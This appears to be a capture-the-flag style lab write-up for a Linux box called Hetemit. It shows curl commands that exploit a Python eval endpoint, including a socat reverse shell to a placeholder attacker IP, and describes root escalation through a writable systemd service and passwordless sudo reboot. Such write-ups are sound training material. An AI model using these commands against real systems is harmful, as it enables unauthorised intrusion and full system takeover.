# 🧬 Hetemit (Linux)

**Enumeration:**  
Nmap revealed several open ports including 21, 22, 80, 139, 445, 18000, and 50000.  
On port 18000, a web app (Protomba) required an invite code to register.  
Port 50000 exposed a Python Werkzeug API with `/generate` and `/verify` endpoints.  
Used `/generate` to get an invite code and registered, but the real vulnerability was in `/verify`, which evaluates Python code directly from input.

---

**Initial Foothold:**  
Exploited the Python eval by sending:  
`curl -X POST --data "code=os" http://192.168.120.36:50000/verify`  

Confirmed code execution. Got a shell as `cmeeks` by abusing socat:  
`curl -X POST --data "code=os.system('socat TCP:MY_IP:18000 EXEC:sh')" http://192.168.120.36:50000/verify`  

Listener caught the shell on port 18000.

---

**Privilege Escalation:**  
Found writable systemd service: `/etc/systemd/system/pythonapp.service`.  

Checked sudo rights: user `cmeeks` could run `/sbin/reboot` as root without password.  

Overwrote the service to execute a reverse shell as root (via `/home/cmeeks/reverse.sh`) and rebooted the machine with `sudo reboot`.  

After reboot, caught a root shell.

---

**Summary:**  
- Exploited insecure Python eval endpoint for RCE  
- Abused writable systemd service for persistence and escalation  
- Used NOPASSWD sudo reboot to trigger malicious service and get root shell  
- Key lesson: Never leave dangerous API code or writable service files on production boxes  
